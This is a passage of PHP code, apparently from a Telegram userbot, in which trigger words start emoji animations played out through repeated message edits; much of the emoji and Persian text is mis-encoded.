                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐ฟ๐๐๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐ฟ๐๐๐๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐ฟ๐๐๐ฟ๐๐๐ฟ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐ฟ๐๐๐ฟ๐๐๐ฟ๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐ฟ๐๐ฟ๐๐ฟ๐๐ฟ๐๐ฟ๐๐ฟ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โำบฦฒาาฮชฦวค ฦณัฒฦฒโ']);
                    }
                    if ($text == 'ุฑูุต' or $text == 'danc') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฒ๐ณ๐ฒ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฒ๐ฅ๐ฅ
๐ฅ๐ฅ๐ณ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฒ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฒ๐ฅ
๐ฅ๐ฅ๐ณ๐ฅ๐ฅ
๐ฅ๐ฒ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฒ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ณ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฒ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ช๐ช๐ช๐ช๐ช
๐ช๐ช๐ช๐ช๐ช
๐ช๐ฒ๐ณ๐ฒ๐ช
๐ช๐ช๐ช๐ช๐ช
๐ช๐ช๐ช๐ช๐ช']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ช๐ช๐ช๐ช๐ช
๐ช๐ช๐ฒ๐ช๐ช
๐ช๐ช๐ณ๐ช๐ช
๐ช๐ช๐ฒ๐ช๐ช
๐ช๐ช๐ช๐ช๐ช']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ช๐ช๐ช๐ช๐ช
๐ช๐ช๐ช๐ฒ๐ช
๐ช๐ช๐ณ๐ช๐ช
๐ช๐ฒ๐ช๐ช๐ช
๐ช๐ช๐ช๐ช๐ช']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ช๐ช๐ช๐ช๐ช
๐ช๐ฒ๐ช๐ช๐ช
๐ช๐ช๐ณ๐ช๐ช
๐ช๐ช๐ช๐ฒ๐ช
๐ช๐ช๐ช๐ช๐ช']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ
๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ
๐ฆ๐ฒ๐ณ๐ฒ๐ฆ
๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ
๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ
๐ฆ๐ฆ๐ฒ๐ฆ๐ฆ
๐ฆ๐ฆ๐ณ๐ฆ๐ฆ
๐ฆ๐ฆ๐ฒ๐ฆ๐ฆ
๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ
๐ฆ๐ฆ๐ฆ๐ฒ๐ฆ
๐ฆ๐ฆ๐ณ๐ฆ๐ฆ
๐ฆ๐ฒ๐ฆ๐ฆ๐ฆ
๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ
๐ฆ๐ฒ๐ฆ๐ฆ๐ฆ
๐ฆ๐ฆ๐ณ๐ฆ๐ฆ
๐ฆ๐ฆ๐ฆ๐ฒ๐ฆ
๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โป๏ธ๐ฉ๐ฉโป๏ธโป๏ธ
โป๏ธโป๏ธ๐ฉโป๏ธ๐ฉ
๐ฉ๐ฉ๐ณ๐ฉ๐ฉ
๐ฉโป๏ธ๐ฉโป๏ธโป๏ธ
โป๏ธโป๏ธ๐ฉ๐ฉโป๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉโฌ๏ธโฌ๏ธ๐ฉ๐ฉ
๐ฉ๐ฉโฌ๏ธ๐ฉโฌ๏ธ
โฌ๏ธโฌ๏ธ๐ฒโฌ๏ธโฌ๏ธ
โฌ๏ธ๐ฉโฌ๏ธ๐ฉ๐ฉ
๐ฉ๐ฉโฌ๏ธโฌ๏ธ๐ฉ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ
โซ๏ธโซ๏ธโซ๏ธโซ๏ธโซ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โุชูููููููููููููููุงููููููููููููุงูโ']);
                    }
                    if ($text == 'ุฎุงุฑ' or $text == 'ฺฉุงฺฉุชูุณ') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐ตูููููููููููููููููููููููููููููููููููููููู ๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตูููููููููููููููููููููููููููููููููููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตููููููููููููููููููููููููููููููููููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตูููููููููููููููููููููููููููููููููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตููููููููููููููููููููููููููููููููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตูููููููููููููููููููููููููููููููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตููููููููููููููููููููููููููููููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตูููููููููููููููููููููููููููููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตููููููููููููููููููููููููููููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตูููููููููููููููููููููููููููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตููููููููููููููููููููููููููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตูููููููููููููููููููููููููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตููููููููููููููููููููููููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตูููููููููููููููููููููููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตูููููููููููููููููููููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตููููููููููููููููููููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตูููููููููููููููููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตููููููููููููููููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตููููููููููููููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตููููููููููููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตููููููููููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตูููููููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตูููููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตููููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตูููููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตูููููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตูููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตููู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตูู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ตู๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ต๐ฅ๐']);
                        yield
                        $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅBommmm๐ฅ']);
                    }
                    if ($text == 'ุฑูุต ูุฑุจุน' or $text == 'ุฏูุณ') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ??๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
